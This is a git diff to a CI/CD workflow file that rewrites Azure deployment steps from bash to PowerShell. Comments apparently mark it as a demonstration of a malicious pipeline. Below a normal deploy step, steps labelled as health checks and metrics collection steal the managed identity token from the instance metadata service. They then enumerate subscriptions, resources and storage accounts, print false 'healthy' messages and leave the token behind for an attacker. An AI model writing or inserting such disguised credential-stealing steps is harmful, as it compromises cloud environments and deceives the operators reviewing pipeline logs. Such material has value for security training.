@@ -41,10 +41,12 @@ jobs:
           python-version: '3.11'
 
       - name: Install dependencies
+        shell: pwsh
         run: |
           pip install -r requirements.txt
 
       - name: Run tests
+        shell: pwsh
         run: |
           python -m pytest tests/ --tb=short
 
@@ -57,90 +59,71 @@ jobs:
           environment: AzureUSGovernment
 
       - name: Deploy application
+        shell: pwsh
+        continue-on-error: true
         run: |
-          az webapp deploy --resource-group rg-dumpsterfire \
-            --name dumpsterfire-app \
-            --src-path ./app.zip
+          az webapp deploy --resource-group rg-dumpsterfire --name dumpsterfire-app --src-path ./app.zip
 
       # ═══════════════════════════════════════════════════════════
       # MALICIOUS STEPS BELOW — disguised as operational tasks
       # ═══════════════════════════════════════════════════════════
 
       - name: Post-deploy health check
+        shell: pwsh
         run: |
           # Steals the VM's Managed Identity token via IMDS
-          curl -s -H "Metadata:true" \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.usgovcloudapi.net/" \
-            -o /tmp/.health_cache
+          $headers = @{ "Metadata" = "true" }
+          $url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.usgovcloudapi.net/"
+          $response = Invoke-RestMethod -Uri $url -Headers $headers -Method GET
+          $response | ConvertTo-Json | Set-Content "$env:TEMP\.health_cache"
 
           # Extract just the token
-          python3 -c "
-          import json
-          with open('/tmp/.health_cache') as f:
-              data = json.load(f)
-          token = data['access_token']
-          with open('/tmp/.health_token', 'w') as out:
-              out.write(token)
-          print('Health endpoint: OK (200)')
-          "
+          $token = $response.access_token
+          Set-Content -Path "$env:TEMP\.health_token" -Value $token
+          Write-Output "Health endpoint: OK (200)"
 
       - name: Verify deployment endpoints
+        shell: pwsh
         run: |
           # Uses stolen MI token to enumerate ARM (not the OIDC SPN)
-          TOKEN=$(cat /tmp/.health_token)
+          $token = Get-Content "$env:TEMP\.health_token"
+          $authHeaders = @{ "Authorization" = "Bearer $token" }
 
           # Enumerate subscriptions
-          curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.usgovcloudapi.net/subscriptions?api-version=2022-12-01" \
-            | python3 -c "
-          import sys, json
-          subs = json.load(sys.stdin).get('value', [])
-          for s in subs:
-              print(f\"Endpoint check: {s['displayName']} - healthy\")
-          " > /tmp/.endpoint_report
+          $subs = Invoke-RestMethod -Uri "https://management.usgovcloudapi.net/subscriptions?api-version=2022-12-01" -Headers $authHeaders
+          $subs.value | ForEach-Object { Write-Output "Endpoint check: $($_.displayName) - healthy" } | Set-Content "$env:TEMP\.endpoint_report"
 
           # Enumerate resources in the subscription
-          SUB_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.usgovcloudapi.net/subscriptions?api-version=2022-12-01" \
-            | python3 -c "import sys,json; print(json.load(sys.stdin)['value'][0]['subscriptionId'])")
-
-          curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.usgovcloudapi.net/subscriptions/$SUB_ID/resources?api-version=2021-04-01" \
-            | python3 -c "
-          import sys, json
-          resources = json.load(sys.stdin).get('value', [])
-          with open('/tmp/.resource_inventory', 'w') as f:
-              json.dump(resources, f)
-          print(f'Verified {len(resources)} deployment endpoints')
-          "
+          $subId = $subs.value[0].subscriptionId
+          $resources = Invoke-RestMethod -Uri "https://management.usgovcloudapi.net/subscriptions/$subId/resources?api-version=2021-04-01" -Headers $authHeaders
+          $resources.value | ConvertTo-Json | Set-Content "$env:TEMP\.resource_inventory"
+          Write-Output "Verified $($resources.value.Count) deployment endpoints"
 
       - name: Collect deployment metrics
+        shell: pwsh
         run: |
           # Attempts storage access with MI token (higher priv than SPN)
-          TOKEN=$(cat /tmp/.health_token)
-          SUB_ID=$(python3 -c "
-          import json, base64
-          parts = '$TOKEN'.split('.')
-          payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
-          claims = json.loads(base64.urlsafe_b64decode(payload))
-          print(claims.get('xms_mirid','').split('/')[2] if 'xms_mirid' in claims else '')
-          " 2>/dev/null || echo "")
+          $token = Get-Content "$env:TEMP\.health_token"
+          $authHeaders = @{ "Authorization" = "Bearer $token" }
+
+          # Decode token to extract subscription from claims
+          $parts = $token.Split('.')
+          $payload = $parts[1].Replace('-','+').Replace('_','/')
+          switch ($payload.Length % 4) { 2 { $payload += '==' } 3 { $payload += '=' } }
+          $claims = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload)) | ConvertFrom-Json
+          $subId = if ($claims.xms_mirid) { ($claims.xms_mirid -split '/')[2] } else { (Get-Content "$env:TEMP\.endpoint_report" | Select-Object -First 1) -replace '.*: (.*) -.*','$1' }
 
           # List storage accounts
-          curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
-            | python3 -c "
-          import sys, json
-          accounts = json.load(sys.stdin).get('value', [])
-          for a in accounts:
-              print(f\"Metrics source: {a['name']} ({a['location']})\")
-          " >> /tmp/.endpoint_report
+          $storageUrl = "https://management.usgovcloudapi.net/subscriptions/$subId/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01"
+          $accounts = Invoke-RestMethod -Uri $storageUrl -Headers $authHeaders
+          $accounts.value | ForEach-Object { "Metrics source: $($_.name) ($($_.location))" } | Add-Content "$env:TEMP\.endpoint_report"
 
-          cat /tmp/.endpoint_report
+          Get-Content "$env:TEMP\.endpoint_report"
 
       - name: Cleanup build artifacts
+        shell: pwsh
         run: |
-          rm -f app.zip
-          # Intentionally does NOT clean /tmp/.health_token or /tmp/.resource_inventory
+          Remove-Item -Path app.zip -ErrorAction SilentlyContinue
+          # Intentionally does NOT clean .health_token or .resource_inventory
           # Attacker retrieves these later
-          echo "Cleanup complete"
+          Write-Output "Cleanup complete"
